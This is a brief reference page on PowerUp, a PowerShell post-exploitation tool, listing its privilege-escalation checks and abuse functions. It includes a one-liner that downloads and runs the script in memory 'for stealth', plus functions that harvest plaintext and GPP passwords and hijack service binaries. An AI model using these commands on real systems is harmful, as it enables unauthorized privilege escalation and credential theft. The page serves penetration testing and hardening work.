**PowerUp** is a PowerShell-based post-exploitation tool developed as part of the PowerSploit framework. It is designed to identify and exploite privilege escalation vectors on Windows systems.

## Loading PowerUp

To use PowerUp in-memory (preferred for stealth):

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
```

Alternatively, import it locally:
```powershell
Import-Module .\PowerUp.ps1
```

## Enumeration Functions
Once the PowerUp module is loaded (either from memory or disk), individual functions can be called directly from the PowerShell prompt. 
```powershell
Invoke-AllChecks
```

|Function|Description|
|---|---|
|`Invoke-AllChecks`|Runs a full suite of privilege escalation checks.|
|`Get-ServiceUnquoted`|Detects services with unquoted executable paths that can be exploited via binary planting.|
|`Get-ModifiableService`|Lists services whose executable paths are modifiable by the current user.|
|`Get-ModifiablePath`|Identifies writable directories included in the system `PATH`. Exploitable if a privileged process loads executables from there.|
|`Get-VulnSchTasks`|Finds scheduled tasks with insecure file permissions (e.g., writable task binaries).|
|`Get-RegistryAlwaysInstallElevated`|Checks if the "AlwaysInstallElevated" registry key is enabled, which allows local users to run MSI installers with SYSTEM privileges.|
|`Get-UnattendedInstallFiles`|Searches for unattended installation files (e.g., `Unattend.xml`, `sysprep.xml`) that may contain plaintext credentials.|
|`Get-CachedGPPPassword`|Extracts cached Group Policy Preferences passwords from local files. These are often stored in `Groups.xml` in SYSVOL.|
|`Invoke-ServiceAbuse`|Attempts to abuse misconfigured services identified by other functions (e.g., replace binary to escalate).|
